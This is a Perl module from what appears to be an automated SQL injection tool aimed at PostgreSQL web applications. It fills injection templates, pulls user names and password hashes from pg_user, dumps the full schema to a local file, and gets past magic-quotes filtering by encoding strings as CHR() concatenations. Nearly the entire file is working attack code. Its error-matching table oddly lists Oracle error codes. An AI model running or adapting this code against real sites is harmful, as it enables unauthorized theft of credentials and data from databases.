package isr_postgres;
use Data::Dump qw(dump);

#Author: Francisco Amato

my @space=(' ',"\t","/**/");
#Atributos publicos

#Private variable
@db_errors = (
	    {
             'code'  	=>'ORA-00942',
             'message'  =>'table or view does not exist',
             'type'     =>1
            },
	    {
             'code'  	=>'ORA-00933',
             'message'  =>'SQL command not properly ended',
             'type'     =>1
            },
	    {
             'code'  	=>'ORA-01790',
             'message'  =>'expression must have same datatype as corresponding expression',
             'type'     =>1
            },
	    {
             'code'  	=>'ORA-01031',
             'message'  =>'insufficient privileges',
             'type'     =>1
            },
	    {
             'code'  	=>'ORA-00932',
             'message'  =>'inconsistent datatypes',
             'type'     =>1
            }	    
	    );

my @col_testpage=('usename','passwd');
my $name_test="pg_catalog.pg_user";
my $coltype_testpage={
  usename          => "text",
  passwd          => "text"
  };
	

my @col_dbschema=('(select nspname from pg_namespace where a.relnamespace =pg_namespace.oid)','relname','attname','(select typname from pg_type where oid=b.atttypid)');
my $coltype_dbschema={
  '(select nspname from pg_namespace where a.relnamespace =pg_namespace.oid)' => "text",
  relname          => "text",
  attname	=> "text",
  '(select typname from pg_type where oid=b.atttypid)' => "text"
  };

my $name_dbschema="(pg_attribute b JOIN pg_class a ON (a.oid = b.attrelid))";
my $name_dbschematail="(attnum > 0 and ((a.relkind = 'r'::\"char\") OR (a.relkind = 's'::\"char\")))";

#Constructor y destructor de clase
sub new {
    my $classname = shift;
    my $class = {@_};

    #Atributos de instancia

    bless $class, $classname;
    return $class;
}

# Accessores y mutadores
sub get_testpage { my $class = shift; return $class->{testpage};}
sub get_dbschema { my $class = shift; return $class->{dbschema};}

#Public method
sub do_testpage {
    my $class = shift;
    $class->{testpage}=process_page($class,$name_test,$coltype_testpage,undef,undef,@col_testpage);
}

sub do_dbsnames {
    my $class = shift;
    $class->{error} = "Dbsnames not implement\n";
    $class->{dbsnames} = -1; # not implement
}


sub do_dbschema {
    my $class = shift;
    $class->{dbschema}=process_page($class,$name_dbschema,$coltype_dbschema,$name_dbschematail,undef,@col_dbschema);
    die "Error: " . $class->{error} if ($class->{error});
    
    open(FF, "> ./template/$class->{conn}->{'session'}.dbschema");
        print FF $class->get_dbschema;
    close(FF);
		    
}

#Private method
sub process_page{

    my ($class,$table,$coltype,$where,$tail,@col) = @_;
    my $datos=$class->{conn}->{'inj'};
    my $val;
    my @ncol;

    #convert all to str
    foreach(@col){
        if ($coltype->{$_} =~ /^bool|boolean$/){
            push @ncol,"CASE WHEN $_=true THEN 1 ELSE 0 END";
	}
        elsif($coltype->{$_} eq "date"){
            push @ncol,$_;
	    
#        }elsif($coltype->{$_} !~ "varchar"){
#            push @ncol,"convert(varchar,COALESCE($_,'null'))";
        }else{
            push @ncol,"COALESCE($_,'0'::$coltype->{$_})";
        }
    }

    #select
    $val = &getconcat(@ncol);

    #where
    my $mwhere;
    if($where){ #exist structure where
        $mwhere = "where $where";
        if ($class->{conn}->{'where'}){ #user define where
            $mwhere .= " and $class->{conn}->{'where'}";
        }
    }elsif($class->{conn}->{'where'}){
        $mwhere="where $class->{conn}->{'where'}";
    }

    #tail
    my $mtail=$class->{conn}->{'tail'};

    
    $datos=~ s/\<VALUE\>/$val/gi;
    $datos=~ s/\<TABLE\>/$table/gi;
    $datos=~ s/\<WHERE\>/$mwhere/gi;    
    $datos=~ s/\<TAIL\>/$mtail/gi;
    
    #Magic quotes evasion
    $datos =~ s/'([^']+)'/magicquotes($1)/egi if $class->{conn}->{'magicquotes'}; #'
    
    
    $class->{lastinj}=$datos;
    $class->{conn}->getpage("",$datos);
    if ($class->{conn}->{code} == 404){
	$class->{error} = "Error 404\n";
    }else{
	$class->{error}=check_errors($class->{conn}->{response});
    }
    return $class->{conn}->{response};
}
#CHR(%d)

sub magicquotes {
    my ($val) = @_;
    my @list= map { $_ = 'CHR('.$_.')' } unpack('C*', $val);
    my $return = &getconcat(@list);
    $return =~ s/\|\|'\[\_\_\]'\|\|/\|\|/gi;
    return $return;
}

sub check_errors {
    my ($response) = @_;
    my $ret="";
    foreach my $item (@db_errors){
	if ($response =~ /$item->{'code'}/){
	    $ret.="Code: $item->{'code'}, Detail: $item->{'message'}\n";
	}
    }
    return $ret;
}

sub getconcat {
        my (@items) =@_;
        my $can=$#items;
        my $str=getvalue($items[0]);
        for (my $i=1;$i <=$can;$i++)
        {
                $str.= "||'[__]'||".getvalue($items[$i]);
        }
        return $str;
}

sub getvalue {
    my ($str) = @_;
    if ($str){
        return $str;
    }else{
        return "'".$str."'";
    }
}
1;
